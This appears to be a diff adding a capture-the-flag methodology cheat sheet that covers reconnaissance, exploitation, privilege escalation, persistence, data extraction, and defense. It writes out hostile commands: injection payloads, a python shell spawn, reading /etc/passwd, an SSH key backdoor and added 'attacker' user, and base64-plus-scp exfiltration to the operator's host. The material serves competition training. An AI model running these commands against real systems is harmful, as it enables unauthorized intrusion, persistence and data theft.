@@ -1,0 +1,109 @@
+1. Information Gathering & Enumeration
+
+    Objective: Gather as much information as possible about the target system or network.
+    Approach: Start with passive recon (public information) and then move to active scanning.
+    Steps and Commands:
+        Network Scanning: nmap -A <target-ip> or masscan -p1-65535 <target-ip>
+        Use masscan for quick scans, then dive deeper with Nmap.
+        Service Enumeration: For each identified service, use specific tools to probe deeper:
+            Web (HTTP/S): nikto -h http://<target-ip>, gobuster dir -u http://<target-ip> -w /path/to/wordlist
+            FTP: ftp <target-ip>, try anonymous login if allowed.
+            SMTP: nc <target-ip> 25, then test for open relay with commands like HELO and MAIL FROM.
+        Directory Enumeration: Use a directory buster like gobuster or dirsearch to uncover hidden resources in web apps.
+
+2. Vulnerability Analysis
+
+    Objective: Identify weaknesses in the target system that might allow exploitation.
+    Approach: Based on the services identified, determine if any known vulnerabilities (CVEs) or misconfigurations are present.
+    Steps and Commands:
+        Search for Known CVEs: searchsploit <service/version>, cvedetails <software-name> <version> Check for existing exploits in the Exploit Database or CVE listings.
+        Manual Testing for Common Vulnerabilities: Test for common web vulnerabilities:
+            SQL Injection: sqlmap -u "http://<target-ip>/vulnerable_page?id=1"
+            XSS Injection: Manually input payloads like <script>alert('XSS')</script> to see if input is sanitized.
+            Command Injection: Try appending ; ls to URL parameters or input fields.
+        Configuration & Access Control Checks: Check if default credentials work (admin:admin), and test for directory traversal (../ patterns in URL).
+
+3. Exploitation
+
+    Objective: Gain access or escalate privileges on a system by exploiting identified vulnerabilities.
+    Approach: Use manual methods first to confirm exploitability, then leverage automated tools for exploitation if necessary.
+    Steps and Commands:
+        Exploit Known Vulnerabilities: Use exploits relevant to your target, and test responsibly.
+            For CVEs: msfconsole (Metasploit) and use exploit/path
+            Manual Payloads: Craft your own payload with tools like msfvenom or python -c 'import os; os.system("/bin/sh")' for simple shell access.
+        Post-Exploitation Checks: After gaining access, explore the system carefully:
+            Basic Enumeration: uname -a, id, whoami
+            Check for Sensitive Files: ls -la /home, cat /etc/passwd
+        Privilege Escalation Check: Search for writable files, SUID binaries, or accessible config files:
+            find / -perm -4000 -type f 2>/dev/null (SUID binaries)
+            sudo -l (Sudo permissions)
+
+4. Privilege Escalation
+
+    Objective: Escalate privileges to obtain higher-level access, usually root.
+    Approach: Enumerate the system to find vulnerabilities, misconfigurations, or files you can exploit.
+    Steps and Commands:
+        Check Sudo Permissions: sudo -l
+        Look for binaries that can be run with sudo but don't require a password.
+        Kernel Exploits: If the system is running an older kernel, search for privilege escalation exploits.
+            Identify kernel version: uname -r
+            Search for kernel exploits: searchsploit linux kernel <version>
+        Cron Jobs and Scheduled Tasks: cat /etc/crontab
+        Check for jobs that run with root privileges and may be modifiable.
+        Writable Files: find / -writable -type f 2>/dev/null
+        Identify files that may allow privilege escalation through modification.
+
+5. Persistence
+
+    Objective: Maintain access to the system for ongoing control.
+    Approach: Install backdoors, add users, or modify startup scripts (if allowed in the competition rules).
+    Steps and Commands:
+        Create a New User: useradd -m attacker && echo "attacker:password" | chpasswd
+        Backdoor an SSH Key: echo "your-ssh-public-key" >> /root/.ssh/authorized_keys
+        Modify Startup Scripts: Add commands in /etc/rc.local to run on startup.
+
+6. Defense & Hardening (If Part of the Competition)
+
+    Objective: Protect your access or harden the system against other attackers.
+    Approach: Patch vulnerabilities, secure sensitive files, and monitor for intrusions.
+    Steps and Commands:
+        Disable Unused Services: systemctl stop <service>, then systemctl disable <service>
+        Change SSH Port or Restrict Access: Edit /etc/ssh/sshd_config to modify the SSH port and restrict access.
+        Firewall Configuration: Use ufw or iptables to block unneeded ports.
+            Example: ufw deny <port> or iptables -A INPUT -p tcp --dport <port> -j DROP
+        Monitor Critical Files: Use inotifywait to watch files, or set up logging for suspicious activity.
+            Example: inotifywait -m /etc/passwd
+
+7. Data Extraction & Reporting
+
+    Objective: Gather sensitive data or capture flags while documenting findings.
+    Approach: Use minimal footprint, encode data if transferring, and keep careful documentation.
+    Steps and Commands:
+        Identify Flag Locations: Flags might be in common directories like /root, /home/user, or /var/www.
+            Example: find / -name *flag* 2>/dev/null
+        Copy Files with Minimal Footprint: Use SCP or encode files to bypass file transfer restrictions.
+            Encode with Base64: base64 /path/to/file > file.b64
+            Transfer with SCP: scp file.b64 user@<your-ip>:/path/to/destination
+        Document Findings: Keep a log of each step you take, commands used, and flags found for report clarity.
+
+8. Forensics & Incident Response
+
+    Objective: Identify and mitigate other teams' access, secure the system, or respond to detected intrusions.
+    Approach: Investigate suspicious activity, log evidence, and remediate entry points.
+    Steps and Commands:
+        Analyze System Logs: Check logs for signs of intrusions or anomalies.
+            Example: grep "Failed password" /var/log/auth.log | tail -n 20
+        Check for Rootkits or Malware: Use tools like chkrootkit or rkhunter.
+            Example: chkrootkit
+            Example: rkhunter --check
+        List Network Connections: netstat -tulnp
+        Check for suspicious open ports or active connections.
+        Kill Unauthorized Processes: ps aux | grep <suspicious-process> followed by kill -9 <pid>
+
+General Tips
+
+    Documentation: Document every step, as clear notes are crucial for scoring and troubleshooting.
+    Tool Familiarity: Know basic command-line tools for Linux, networking, and file handling.
+    Time Management: If stuck, move on and come back later. Focus on high-impact actions first.
+    Rules Compliance: Follow competition rules, especially around allowed attacks, modifications, and persistence methods.
+
